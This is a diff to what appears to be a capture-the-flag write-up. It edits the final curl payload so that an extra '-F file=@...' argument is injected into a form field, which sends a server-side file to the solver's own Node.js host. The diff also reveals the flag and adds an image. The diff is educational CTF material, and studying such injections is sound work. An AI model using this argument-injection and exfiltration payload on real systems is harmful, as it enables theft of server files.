@@ -216,11 +216,13 @@ Now, we need to determine what or where is the flag file. The file is usually on
 Thus, this is the final command with the payload I use to send to the server.
 
 ```bash
-curl -F url="file=@hopes_and_dreams <public hostname of nodejs server>" <ip address of server>
+curl -F url="-F file=@hopes_and_dreams <public hostname of nodejs server>" <ip address of server>
 ```
 
 >Running the command gives us the flag here `umcs{n1c3_j0b_ste4l1ng_myh0p3_4nd_dr3ams}`
 {: .prompt-tip} 
+
+![](assets/img/image12.png)
 
 ## Closing
 
